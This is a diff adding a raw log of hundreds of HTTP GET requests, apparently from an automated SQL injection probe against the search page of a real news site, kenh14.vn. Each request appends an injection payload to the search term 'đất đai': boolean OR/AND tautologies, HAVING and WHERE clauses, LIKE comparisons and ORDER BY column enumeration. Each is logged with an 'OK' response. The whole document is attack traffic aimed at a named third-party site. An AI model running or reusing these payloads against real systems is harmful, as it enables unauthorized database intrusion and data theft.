@@ -1,0 +1,836 @@
+[Request]: time:201.88730001449585 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai OR 1=0"} - {"":"undefined OR 1=0"} -  OR 1=0
+[Response]: OK -  OR 1=0
+[Request]: time:150.15909999608994 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai OR 1=1"} - {"":"undefined OR 1=1"} -  OR 1=1
+[Response]: OK -  OR 1=1
+[Request]: time:191.02609997987747 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai OR x=x"} - {"":"undefined OR x=x"} -  OR x=x
+[Response]: OK -  OR x=x
+[Request]: time:180.99400001764297 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai OR x=y"} - {"":"undefined OR x=y"} -  OR x=y
+[Response]: OK -  OR x=y
+[Request]: time:180.6080999970436 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai OR 1=1#"} - {"":"undefined OR 1=1#"} -  OR 1=1#
+[Response]: OK -  OR 1=1#
+[Request]: time:156.45770001411438 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai OR 1=0#"} - {"":"undefined OR 1=0#"} -  OR 1=0#
+[Response]: OK -  OR 1=0#
+[Request]: time:182.83350002765656 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai OR x=x#"} - {"":"undefined OR x=x#"} -  OR x=x#
+[Response]: OK -  OR x=x#
+[Request]: time:220.99000000953674 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai OR x=y#"} - {"":"undefined OR x=y#"} -  OR x=y#
+[Response]: OK -  OR x=y#
+[Request]: time:130.9021999835968 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai OR 1=1-- "} - {"":"undefined OR 1=1-- "} -  OR 1=1-- 
+[Response]: OK -  OR 1=1-- 
+[Request]: time:165.12550002336502 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai OR 1=0-- "} - {"":"undefined OR 1=0-- "} -  OR 1=0-- 
+[Response]: OK -  OR 1=0-- 
+[Request]: time:213.85969996452332 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai OR x=x-- "} - {"":"undefined OR x=x-- "} -  OR x=x-- 
+[Response]: OK -  OR x=x-- 
+[Request]: time:129.4326000213623 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai OR x=y-- "} - {"":"undefined OR x=y-- "} -  OR x=y-- 
+[Response]: OK -  OR x=y-- 
+[Request]: time:146.68529999256134 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai OR 3409=3409 AND ('pytW' LIKE 'pytW"} - {"":"undefined OR 3409=3409 AND ('pytW' LIKE 'pytW"} -  OR 3409=3409 AND ('pytW' LIKE 'pytW
+[Response]: OK -  OR 3409=3409 AND ('pytW' LIKE 'pytW
+[Request]: time:168.8973000049591 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai OR 3409=3409 AND ('pytW' LIKE 'pytY"} - {"":"undefined OR 3409=3409 AND ('pytW' LIKE 'pytY"} -  OR 3409=3409 AND ('pytW' LIKE 'pytY
+[Response]: OK -  OR 3409=3409 AND ('pytW' LIKE 'pytY
+[Request]: time:134.57139998674393 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai HAVING 1=1"} - {"":"undefined HAVING 1=1"} -  HAVING 1=1
+[Response]: OK -  HAVING 1=1
+[Request]: time:175.76779997348785 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai HAVING 1=0"} - {"":"undefined HAVING 1=0"} -  HAVING 1=0
+[Response]: OK -  HAVING 1=0
+[Request]: time:137.78939998149872 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai HAVING 1=1#"} - {"":"undefined HAVING 1=1#"} -  HAVING 1=1#
+[Response]: OK -  HAVING 1=1#
+[Request]: time:167.14370000362396 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai HAVING 1=0#"} - {"":"undefined HAVING 1=0#"} -  HAVING 1=0#
+[Response]: OK -  HAVING 1=0#
+[Request]: time:164.96610003709793 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai HAVING 1=1-- "} - {"":"undefined HAVING 1=1-- "} -  HAVING 1=1-- 
+[Response]: OK -  HAVING 1=1-- 
+[Request]: time:211.13349997997284 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai HAVING 1=0-- "} - {"":"undefined HAVING 1=0-- "} -  HAVING 1=0-- 
+[Response]: OK -  HAVING 1=0-- 
+[Request]: time:182.28219997882843 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai AND 1=1"} - {"":"undefined AND 1=1"} -  AND 1=1
+[Response]: OK -  AND 1=1
+[Request]: time:188.91400003433228 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai AND 1=0"} - {"":"undefined AND 1=0"} -  AND 1=0
+[Response]: OK -  AND 1=0
+[Request]: time:171.10670000314713 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai AND 1=1-- "} - {"":"undefined AND 1=1-- "} -  AND 1=1-- 
+[Response]: OK -  AND 1=1-- 
+[Request]: time:187.11649996042252 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai AND 1=0-- "} - {"":"undefined AND 1=0-- "} -  AND 1=0-- 
+[Response]: OK -  AND 1=0-- 
+[Request]: time:199.76730000972748 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai AND 1=1#"} - {"":"undefined AND 1=1#"} -  AND 1=1#
+[Response]: OK -  AND 1=1#
+[Request]: time:128.82590001821518 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai AND 1=0#"} - {"":"undefined AND 1=0#"} -  AND 1=0#
+[Response]: OK -  AND 1=0#
+[Request]: time:153.25289994478226 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai AND 1=1 AND '%'='"} - {"":"undefined AND 1=1 AND '%'='"} -  AND 1=1 AND '%'='
+[Response]: OK -  AND 1=1 AND '%'='
+[Request]: time:152.58569997549057 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai AND 1=0 AND '%'='"} - {"":"undefined AND 1=0 AND '%'='"} -  AND 1=0 AND '%'='
+[Response]: OK -  AND 1=0 AND '%'='
+[Request]: time:173.81709998846054 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai AND 1083=1083 AND (1427=1427"} - {"":"undefined AND 1083=1083 AND (1427=1427"} -  AND 1083=1083 AND (1427=1427
+[Response]: OK -  AND 1083=1083 AND (1427=1427
+[Request]: time:157.7664999961853 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai AND 7506=9091 AND (5913=5913"} - {"":"undefined AND 7506=9091 AND (5913=5913"} -  AND 7506=9091 AND (5913=5913
+[Response]: OK -  AND 7506=9091 AND (5913=5913
+[Request]: time:386.20329999923706 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai AND 1083=1083 AND ('1427=1427"} - {"":"undefined AND 1083=1083 AND ('1427=1427"} -  AND 1083=1083 AND ('1427=1427
+[Response]: OK -  AND 1083=1083 AND ('1427=1427
+[Request]: time:574.0731999874115 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai AND 7506=9091 AND ('5913=5913"} - {"":"undefined AND 7506=9091 AND ('5913=5913"} -  AND 7506=9091 AND ('5913=5913
+[Response]: OK -  AND 7506=9091 AND ('5913=5913
+[Request]: time:137.89880001544952 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai AND 7300=7300 AND 'pKlZ'='pKlZ"} - {"":"undefined AND 7300=7300 AND 'pKlZ'='pKlZ"} -  AND 7300=7300 AND 'pKlZ'='pKlZ
+[Response]: OK -  AND 7300=7300 AND 'pKlZ'='pKlZ
+[Request]: time:150.0813000202179 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai AND 7300=7300 AND 'pKlZ'='pKlY"} - {"":"undefined AND 7300=7300 AND 'pKlZ'='pKlY"} -  AND 7300=7300 AND 'pKlZ'='pKlY
+[Response]: OK -  AND 7300=7300 AND 'pKlZ'='pKlY
+[Request]: time:166.2587000131607 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai AND 7300=7300 AND ('pKlZ'='pKlZ"} - {"":"undefined AND 7300=7300 AND ('pKlZ'='pKlZ"} -  AND 7300=7300 AND ('pKlZ'='pKlZ
+[Response]: OK -  AND 7300=7300 AND ('pKlZ'='pKlZ
+[Request]: time:151.4031000137329 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai AND 7300=7300 AND ('pKlZ'='pKlY"} - {"":"undefined AND 7300=7300 AND ('pKlZ'='pKlY"} -  AND 7300=7300 AND ('pKlZ'='pKlY
+[Response]: OK -  AND 7300=7300 AND ('pKlZ'='pKlY
+[Request]: time:142.11189997196198 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai AS INJECTX WHERE 1=1 AND 1=1"} - {"":"undefined AS INJECTX WHERE 1=1 AND 1=1"} -  AS INJECTX WHERE 1=1 AND 1=1
+[Response]: OK -  AS INJECTX WHERE 1=1 AND 1=1
+[Request]: time:148.71450001001358 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai AS INJECTX WHERE 1=1 AND 1=0"} - {"":"undefined AS INJECTX WHERE 1=1 AND 1=0"} -  AS INJECTX WHERE 1=1 AND 1=0
+[Response]: OK -  AS INJECTX WHERE 1=1 AND 1=0
+[Request]: time:189.6331000328064 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai AS INJECTX WHERE 1=1 AND 1=1#"} - {"":"undefined AS INJECTX WHERE 1=1 AND 1=1#"} -  AS INJECTX WHERE 1=1 AND 1=1#
+[Response]: OK -  AS INJECTX WHERE 1=1 AND 1=1#
+[Request]: time:171.7707999944687 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai AS INJECTX WHERE 1=1 AND 1=0#"} - {"":"undefined AS INJECTX WHERE 1=1 AND 1=0#"} -  AS INJECTX WHERE 1=1 AND 1=0#
+[Response]: OK -  AS INJECTX WHERE 1=1 AND 1=0#
+[Request]: time:162.91979998350143 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai AS INJECTX WHERE 1=1 AND 1=1--"} - {"":"undefined AS INJECTX WHERE 1=1 AND 1=1--"} -  AS INJECTX WHERE 1=1 AND 1=1--
+[Response]: OK -  AS INJECTX WHERE 1=1 AND 1=1--
+[Request]: time:122.228600025177 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai AS INJECTX WHERE 1=1 AND 1=0--"} - {"":"undefined AS INJECTX WHERE 1=1 AND 1=0--"} -  AS INJECTX WHERE 1=1 AND 1=0--
+[Response]: OK -  AS INJECTX WHERE 1=1 AND 1=0--
+[Request]: time:153.01969999074936 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai WHERE 1=1 AND 1=1"} - {"":"undefined WHERE 1=1 AND 1=1"} -  WHERE 1=1 AND 1=1
+[Response]: OK -  WHERE 1=1 AND 1=1
+[Request]: time:184.2232000231743 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai WHERE 1=1 AND 1=0"} - {"":"undefined WHERE 1=1 AND 1=0"} -  WHERE 1=1 AND 1=0
+[Response]: OK -  WHERE 1=1 AND 1=0
+[Request]: time:116.55510002374649 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai WHERE 1=1 AND 1=1#"} - {"":"undefined WHERE 1=1 AND 1=1#"} -  WHERE 1=1 AND 1=1#
+[Response]: OK -  WHERE 1=1 AND 1=1#
+[Request]: time:163.20859998464584 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai WHERE 1=1 AND 1=0#"} - {"":"undefined WHERE 1=1 AND 1=0#"} -  WHERE 1=1 AND 1=0#
+[Response]: OK -  WHERE 1=1 AND 1=0#
+[Request]: time:156.7804999947548 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai WHERE 1=1 AND 1=1--"} - {"":"undefined WHERE 1=1 AND 1=1--"} -  WHERE 1=1 AND 1=1--
+[Response]: OK -  WHERE 1=1 AND 1=1--
+[Request]: time:333.1917999982834 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai WHERE 1=1 AND 1=0--"} - {"":"undefined WHERE 1=1 AND 1=0--"} -  WHERE 1=1 AND 1=0--
+[Response]: OK -  WHERE 1=1 AND 1=0--
+[Request]: time:139.61280000209808 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 1-- "} - {"":"undefined ORDER BY 1-- "} -  ORDER BY 1-- 
+[Response]: OK -  ORDER BY 1-- 
+[Request]: time:186.71420001983643 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 2-- "} - {"":"undefined ORDER BY 2-- "} -  ORDER BY 2-- 
+[Response]: OK -  ORDER BY 2-- 
+[Request]: time:132.12199997901917 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 3-- "} - {"":"undefined ORDER BY 3-- "} -  ORDER BY 3-- 
+[Response]: OK -  ORDER BY 3-- 
+[Request]: time:798.011999964714 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 4-- "} - {"":"undefined ORDER BY 4-- "} -  ORDER BY 4-- 
+[Response]: OK -  ORDER BY 4-- 
+[Request]: time:169.21760004758835 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 5-- "} - {"":"undefined ORDER BY 5-- "} -  ORDER BY 5-- 
+[Response]: OK -  ORDER BY 5-- 
+[Request]: time:157.3918000459671 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 6-- "} - {"":"undefined ORDER BY 6-- "} -  ORDER BY 6-- 
+[Response]: OK -  ORDER BY 6-- 
+[Request]: time:162.60470002889633 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 7-- "} - {"":"undefined ORDER BY 7-- "} -  ORDER BY 7-- 
+[Response]: OK -  ORDER BY 7-- 
+[Request]: time:172.03229999542236 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 8-- "} - {"":"undefined ORDER BY 8-- "} -  ORDER BY 8-- 
+[Response]: OK -  ORDER BY 8-- 
+[Request]: time:158.5246000289917 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 9-- "} - {"":"undefined ORDER BY 9-- "} -  ORDER BY 9-- 
+[Response]: OK -  ORDER BY 9-- 
+[Request]: time:158.51639997959137 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 10-- "} - {"":"undefined ORDER BY 10-- "} -  ORDER BY 10-- 
+[Response]: OK -  ORDER BY 10-- 
+[Request]: time:141.99720001220703 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 11-- "} - {"":"undefined ORDER BY 11-- "} -  ORDER BY 11-- 
+[Response]: OK -  ORDER BY 11-- 
+[Request]: time:141.16689997911453 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 12-- "} - {"":"undefined ORDER BY 12-- "} -  ORDER BY 12-- 
+[Response]: OK -  ORDER BY 12-- 
+[Request]: time:197.39230000972748 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 13-- "} - {"":"undefined ORDER BY 13-- "} -  ORDER BY 13-- 
+[Response]: OK -  ORDER BY 13-- 
+[Request]: time:153.13119995594025 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 14-- "} - {"":"undefined ORDER BY 14-- "} -  ORDER BY 14-- 
+[Response]: OK -  ORDER BY 14-- 
+[Request]: time:188.89890003204346 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 15-- "} - {"":"undefined ORDER BY 15-- "} -  ORDER BY 15-- 
+[Response]: OK -  ORDER BY 15-- 
+[Request]: time:162.68569999933243 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 16-- "} - {"":"undefined ORDER BY 16-- "} -  ORDER BY 16-- 
+[Response]: OK -  ORDER BY 16-- 
+[Request]: time:147.66560000181198 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 17-- "} - {"":"undefined ORDER BY 17-- "} -  ORDER BY 17-- 
+[Response]: OK -  ORDER BY 17-- 
+[Request]: time:162.6787999868393 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 18-- "} - {"":"undefined ORDER BY 18-- "} -  ORDER BY 18-- 
+[Response]: OK -  ORDER BY 18-- 
+[Request]: time:156.14519995450974 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 19-- "} - {"":"undefined ORDER BY 19-- "} -  ORDER BY 19-- 
+[Response]: OK -  ORDER BY 19-- 
+[Request]: time:149.83100003004074 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 20-- "} - {"":"undefined ORDER BY 20-- "} -  ORDER BY 20-- 
+[Response]: OK -  ORDER BY 20-- 
+[Request]: time:148.73280000686646 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 21-- "} - {"":"undefined ORDER BY 21-- "} -  ORDER BY 21-- 
+[Response]: OK -  ORDER BY 21-- 
+[Request]: time:172.30059999227524 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 22-- "} - {"":"undefined ORDER BY 22-- "} -  ORDER BY 22-- 
+[Response]: OK -  ORDER BY 22-- 
+[Request]: time:209.28409999608994 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 23-- "} - {"":"undefined ORDER BY 23-- "} -  ORDER BY 23-- 
+[Response]: OK -  ORDER BY 23-- 
+[Request]: time:150.25510001182556 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 24-- "} - {"":"undefined ORDER BY 24-- "} -  ORDER BY 24-- 
+[Response]: OK -  ORDER BY 24-- 
+[Request]: time:145.60289996862411 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 25-- "} - {"":"undefined ORDER BY 25-- "} -  ORDER BY 25-- 
+[Response]: OK -  ORDER BY 25-- 
+[Request]: time:134.7393000125885 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 26-- "} - {"":"undefined ORDER BY 26-- "} -  ORDER BY 26-- 
+[Response]: OK -  ORDER BY 26-- 
+[Request]: time:163.099799990654 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 27-- "} - {"":"undefined ORDER BY 27-- "} -  ORDER BY 27-- 
+[Response]: OK -  ORDER BY 27-- 
+[Request]: time:163.02630001306534 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 28-- "} - {"":"undefined ORDER BY 28-- "} -  ORDER BY 28-- 
+[Response]: OK -  ORDER BY 28-- 
+[Request]: time:146.29629999399185 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 29-- "} - {"":"undefined ORDER BY 29-- "} -  ORDER BY 29-- 
+[Response]: OK -  ORDER BY 29-- 
+[Request]: time:187.43839997053146 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 30-- "} - {"":"undefined ORDER BY 30-- "} -  ORDER BY 30-- 
+[Response]: OK -  ORDER BY 30-- 
+[Request]: time:203.1376999616623 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 31337-- "} - {"":"undefined ORDER BY 31337-- "} -  ORDER BY 31337-- 
+[Response]: OK -  ORDER BY 31337-- 
+[Request]: time:293.1570000052452 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 1# "} - {"":"undefined ORDER BY 1# "} -  ORDER BY 1# 
+[Response]: OK -  ORDER BY 1# 
+[Request]: time:218.00169998407364 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 2# "} - {"":"undefined ORDER BY 2# "} -  ORDER BY 2# 
+[Response]: OK -  ORDER BY 2# 
+[Request]: time:170.29009997844696 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 3# "} - {"":"undefined ORDER BY 3# "} -  ORDER BY 3# 
+[Response]: OK -  ORDER BY 3# 
+[Request]: time:263.9737000465393 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 4# "} - {"":"undefined ORDER BY 4# "} -  ORDER BY 4# 
+[Response]: OK -  ORDER BY 4# 
+[Request]: time:169.2272999882698 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 5# "} - {"":"undefined ORDER BY 5# "} -  ORDER BY 5# 
+[Response]: OK -  ORDER BY 5# 
+[Request]: time:146.29229998588562 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 6# "} - {"":"undefined ORDER BY 6# "} -  ORDER BY 6# 
+[Response]: OK -  ORDER BY 6# 
+[Request]: time:153.39589995145798 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 7# "} - {"":"undefined ORDER BY 7# "} -  ORDER BY 7# 
+[Response]: OK -  ORDER BY 7# 
+[Request]: time:177.10119998455048 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 8# "} - {"":"undefined ORDER BY 8# "} -  ORDER BY 8# 
+[Response]: OK -  ORDER BY 8# 
+[Request]: time:311.1409999728203 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 9# "} - {"":"undefined ORDER BY 9# "} -  ORDER BY 9# 
+[Response]: OK -  ORDER BY 9# 
+[Request]: time:165.45190000534058 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 10# "} - {"":"undefined ORDER BY 10# "} -  ORDER BY 10# 
+[Response]: OK -  ORDER BY 10# 
+[Request]: time:135.46480000019073 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 11# "} - {"":"undefined ORDER BY 11# "} -  ORDER BY 11# 
+[Response]: OK -  ORDER BY 11# 
+[Request]: time:163.0330999493599 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 12# "} - {"":"undefined ORDER BY 12# "} -  ORDER BY 12# 
+[Response]: OK -  ORDER BY 12# 
+[Request]: time:163.6486999988556 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 13# "} - {"":"undefined ORDER BY 13# "} -  ORDER BY 13# 
+[Response]: OK -  ORDER BY 13# 
+[Request]: time:144.6453999876976 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 14# "} - {"":"undefined ORDER BY 14# "} -  ORDER BY 14# 
+[Response]: OK -  ORDER BY 14# 
+[Request]: time:150.24790000915527 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 15# "} - {"":"undefined ORDER BY 15# "} -  ORDER BY 15# 
+[Response]: OK -  ORDER BY 15# 
+[Request]: time:201.18159997463226 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 16# "} - {"":"undefined ORDER BY 16# "} -  ORDER BY 16# 
+[Response]: OK -  ORDER BY 16# 
+[Request]: time:197.64980000257492 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 17# "} - {"":"undefined ORDER BY 17# "} -  ORDER BY 17# 
+[Response]: OK -  ORDER BY 17# 
+[Request]: time:238.15729999542236 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 18# "} - {"":"undefined ORDER BY 18# "} -  ORDER BY 18# 
+[Response]: OK -  ORDER BY 18# 
+[Request]: time:128.2189999818802 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 19# "} - {"":"undefined ORDER BY 19# "} -  ORDER BY 19# 
+[Response]: OK -  ORDER BY 19# 
+[Request]: time:179.00319999456406 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 20# "} - {"":"undefined ORDER BY 20# "} -  ORDER BY 20# 
+[Response]: OK -  ORDER BY 20# 
+[Request]: time:138.93399995565414 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 21# "} - {"":"undefined ORDER BY 21# "} -  ORDER BY 21# 
+[Response]: OK -  ORDER BY 21# 
+[Request]: time:206.12080001831055 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 22# "} - {"":"undefined ORDER BY 22# "} -  ORDER BY 22# 
+[Response]: OK -  ORDER BY 22# 
+[Request]: time:241.95929998159409 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 23# "} - {"":"undefined ORDER BY 23# "} -  ORDER BY 23# 
+[Response]: OK -  ORDER BY 23# 
+[Request]: time:132.27670001983643 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 24# "} - {"":"undefined ORDER BY 24# "} -  ORDER BY 24# 
+[Response]: OK -  ORDER BY 24# 
+[Request]: time:183.09560000896454 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 25# "} - {"":"undefined ORDER BY 25# "} -  ORDER BY 25# 
+[Response]: OK -  ORDER BY 25# 
+[Request]: time:205.6356999874115 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 26# "} - {"":"undefined ORDER BY 26# "} -  ORDER BY 26# 
+[Response]: OK -  ORDER BY 26# 
+[Request]: time:164.86959999799728 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 27# "} - {"":"undefined ORDER BY 27# "} -  ORDER BY 27# 
+[Response]: OK -  ORDER BY 27# 
+[Request]: time:179.1624999642372 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 28# "} - {"":"undefined ORDER BY 28# "} -  ORDER BY 28# 
+[Response]: OK -  ORDER BY 28# 
+[Request]: time:142.4844999909401 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 29# "} - {"":"undefined ORDER BY 29# "} -  ORDER BY 29# 
+[Response]: OK -  ORDER BY 29# 
+[Request]: time:183.34179997444153 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 30#"} - {"":"undefined ORDER BY 30#"} -  ORDER BY 30#
+[Response]: OK -  ORDER BY 30#
+[Request]: time:178.19290000200272 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 31337#"} - {"":"undefined ORDER BY 31337#"} -  ORDER BY 31337#
+[Response]: OK -  ORDER BY 31337#
+[Request]: time:405.0778000354767 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 1 "} - {"":"undefined ORDER BY 1 "} -  ORDER BY 1 
+[Response]: OK -  ORDER BY 1 
+[Request]: time:244.99849998950958 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 2 "} - {"":"undefined ORDER BY 2 "} -  ORDER BY 2 
+[Response]: OK -  ORDER BY 2 
+[Request]: time:153.1923999786377 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 3 "} - {"":"undefined ORDER BY 3 "} -  ORDER BY 3 
+[Response]: OK -  ORDER BY 3 
+[Request]: time:220.35539996623993 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 4 "} - {"":"undefined ORDER BY 4 "} -  ORDER BY 4 
+[Response]: OK -  ORDER BY 4 
+[Request]: time:170.25260001420975 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 5 "} - {"":"undefined ORDER BY 5 "} -  ORDER BY 5 
+[Response]: OK -  ORDER BY 5 
+[Request]: time:302.7084999680519 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 6 "} - {"":"undefined ORDER BY 6 "} -  ORDER BY 6 
+[Response]: OK -  ORDER BY 6 
+[Request]: time:171.684199988842 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 7 "} - {"":"undefined ORDER BY 7 "} -  ORDER BY 7 
+[Response]: OK -  ORDER BY 7 
+[Request]: time:127.78969997167587 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 8 "} - {"":"undefined ORDER BY 8 "} -  ORDER BY 8 
+[Response]: OK -  ORDER BY 8 
+[Request]: time:145.5009000301361 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 9 "} - {"":"undefined ORDER BY 9 "} -  ORDER BY 9 
+[Response]: OK -  ORDER BY 9 
+[Request]: time:143.47299998998642 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 10 "} - {"":"undefined ORDER BY 10 "} -  ORDER BY 10 
+[Response]: OK -  ORDER BY 10 
+[Request]: time:190.8827999830246 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 11 "} - {"":"undefined ORDER BY 11 "} -  ORDER BY 11 
+[Response]: OK -  ORDER BY 11 
+[Request]: time:162.19410002231598 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 12 "} - {"":"undefined ORDER BY 12 "} -  ORDER BY 12 
+[Response]: OK -  ORDER BY 12 
+[Request]: time:147.11949998140335 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 13 "} - {"":"undefined ORDER BY 13 "} -  ORDER BY 13 
+[Response]: OK -  ORDER BY 13 
